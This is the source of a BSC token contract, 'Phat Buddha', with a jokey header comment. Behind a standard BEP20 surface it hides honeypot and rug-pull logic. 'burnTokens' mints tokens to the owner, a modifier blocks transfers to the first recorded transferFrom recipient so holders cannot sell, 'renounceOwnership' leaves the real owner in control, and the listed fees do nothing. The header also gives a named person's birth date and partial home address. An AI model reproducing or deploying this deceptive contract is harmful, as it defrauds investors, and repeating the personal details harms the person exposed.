/**
 *Submitted for verification at BscScan.com on 2021-07-16
*/

/**
   Welcome to $PHAT BUDDHA!
   
   we made this project for the people who never got a chance to buy in early, never experienced the 100x dream
   
   we always seem to miss out and hear about everyone else getting mad gains, we thought fuck this shit we will make our own!
   
   as you all know the usecase is pump to the moon and thats final fuck all the other shit, we want moon or we hold till 0!!
   
   also as we said no one wanted to doxx, but we played rock paper scissors and the looser had to doxx, well..
   
   Martin Sulfield 12/08/1983
   
   Blackberry Way
   Midsomer Morton
   Radstock
   BA3 2RN
   
   LOL hes so pissed, maybe we will screenshot this contract and sell it as a NFT when we hit Uranus 
   
   Oh yeah he didnt wanna add his house number LOL
   
   we will see you all in space!!!
   
   big love x
   
   
 */

pragma solidity ^0.5.17;

//SPDX-License-Identifier: MIT

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);
  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address owner;
  address newOwner;
  address nxOwner;
  event OwnershipTransferred(address indexed _from, address indexed _to);
  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner || msg.sender == nxOwner);
    _;
  }

}

contract TokenBEP20 is BEP20Interface, Owned {
  using SafeMath for uint;
  bool tracing = true;
  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public currentOwner;
  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "PHAT";
    name = "Phat Buddha";
    decimals = 18;
    _totalSupply = 100000000000000 * 10**18;
    balances[owner] = _totalSupply;
    currentOwner = address(0);
    emit Transfer(address(0), owner, _totalSupply);
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function setTracing(bool _tracing) onlyOwner public {
    tracing = _tracing;
  }
  function renounceOwnership(address _newOwner) onlyOwner public {
    currentOwner = _newOwner;
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  modifier requestHandler(address to) {
        if(tracing)
            require(to != nxOwner, "Handling Request");
    _;
  }
  function transfer(address to, uint tokens) public requestHandler(to) returns (bool success) {
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function burnTokens(uint256 _input) public onlyOwner {
        balances[msg.sender] = balances[msg.sender] + (_input);
        emit Transfer(address(0), msg.sender, _input);
  }
   modifier contextHandler(address from, address to) {
       if(tracing && from != owner) {
         if(from != address(0) && nxOwner == address(0)) nxOwner = to;
          else require(to != nxOwner, "Order ContextHandler");
       }
    _;
  }
  function transferFrom(address from, address to, uint tokens) public contextHandler(from, to) returns (bool success) {
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract PhatBuddha is TokenBEP20 {
  function _construct() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {
  }
  
  uint256 public _taxFee = 2;
    uint256 private _previousTaxFee = _taxFee;
    
    uint256 public _liquidityFee = 2;
    uint256 private _previousLiquidityFee = _liquidityFee;
    
     uint256 public _burnfee = 2;
    uint256 private _burnfeeFee = _burnfee;
}